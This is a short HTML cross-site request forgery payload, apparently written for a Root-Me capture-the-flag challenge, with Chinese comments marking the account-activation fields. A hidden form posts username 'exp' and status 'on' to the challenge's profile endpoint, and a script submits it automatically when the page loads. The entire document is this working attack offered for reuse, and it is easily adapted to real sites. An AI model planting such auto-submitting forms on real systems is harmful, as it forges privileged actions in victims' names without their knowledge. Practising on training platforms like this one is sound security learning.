<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="exp">  <!-- 激活账号，根据实际修改  -->
    <input type="hidden" name="status" value="on">  <!-- 激活动作 -->
</form>
<script>document.csrf.submit()</script>